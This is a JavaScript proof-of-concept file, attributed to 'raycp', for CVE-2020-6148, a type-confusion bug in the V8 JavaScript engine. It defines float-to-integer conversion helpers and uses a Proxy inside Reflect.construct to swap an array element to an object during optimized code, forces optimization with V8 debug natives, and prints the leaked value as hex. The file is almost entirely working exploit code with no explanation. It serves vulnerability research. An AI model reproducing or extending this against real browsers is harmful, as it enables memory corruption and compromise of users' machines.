/*************************************************************
 * File Name: poc.js
 * 
 * Created on: 2020-02-25 22:28:00
 * Author: raycp
 * 
 * Last Modified: 2020-02-28 06:13:16
 * Description: poc for cve-2020-6148 
************************************************************/

const MAX_ITERATIONS = 100000;
const buf = new ArrayBuffer(8);
const f64 = new Float64Array(8);
const u32 = new Uint32Array(buf);
// Floating point to 64-bit unsigned integer
function f2i(val)
{ 
    f64[0] = val;
    let tmp = Array.from(u32);
    return tmp[1] * 0x100000000 + tmp[0];
}
// 64-bit unsigned integer to Floating point
function i2f(val)
{
    let tmp = [];
    tmp[0] = parseInt(val % 0x100000000);
    tmp[1] = parseInt((val - tmp[0]) / 0x100000000);
    u32.set(tmp);
    return f64[0];
}
// 64-bit unsigned integer to hex
function hex(i)
{
    return "0x"+i.toString(16).padStart(16, "0");
}

let a = [1.1, 2.2, 3.3, 4.4, 5.5, 6.6];

function empty() {}

function f(p) {
  return a.pop(Reflect.construct(empty, arguments, p));
}

let p = new Proxy(Object, {
    get: () => {
        //%DebugPrint(a);
        //%SystemBreak();
        a[0] = {};
        //%DebugPrint(a);
        //%SystemBreak();
        return Object.prototype;
    }
});

function main(p) {
  return f(p);
}

%PrepareFunctionForOptimization(empty);
%PrepareFunctionForOptimization(f);
%PrepareFunctionForOptimization(main);

main(empty);
main(empty);
%OptimizeFunctionOnNextCall(main);
print(hex(f2i(main(p))));

